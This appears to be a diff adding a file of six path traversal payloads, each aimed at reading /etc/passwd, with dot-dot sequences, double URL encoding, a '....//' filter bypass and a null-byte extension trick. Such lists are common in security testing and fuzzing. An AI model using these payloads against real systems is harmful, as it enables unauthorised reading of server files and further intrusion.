@@ -1,0 +1,11 @@
+/etc/passwd
+
+../../../../../../etc/passwd
+
+....//....//....//etc/passwd
+
+..%252F..%252F..%252Fetc%252Fpasswd
+
+/var/www/html/../../../etc/passwd
+
+/../../../etc/passwd%00.png
